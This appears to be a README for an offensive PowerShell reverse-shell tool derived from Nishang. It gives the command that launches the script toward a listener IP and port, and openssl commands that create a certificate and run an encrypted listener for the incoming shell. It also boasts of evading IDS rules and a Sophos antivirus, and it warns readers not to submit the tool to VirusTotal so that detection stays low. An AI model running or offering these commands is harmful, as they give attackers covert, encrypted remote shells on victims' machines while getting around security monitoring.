# RevershellTCPEncrypt_BypassAMSI

This script is based on Nishang's, thanks for sharing<br>

```sh
.\rc2.ps1 192.168.1.6 443
```
## Generate Certificate 

```sh
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

## Generate server reverse shell

```sh
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
```

This shell allows you to encrypt your C2, at the network transfer level at the transport and application layers mitigating the detection of rule anomalies of some IPs/IDs.<br>

A proof of concept was carried out in several AVs, in the photo I avoided a S0ph0s on disk and memory.

![image](https://user-images.githubusercontent.com/66162160/206824568-3d5d7e93-f0b3-4898-927a-c45afdb48882.png)

## ! Do not upload to total virus!
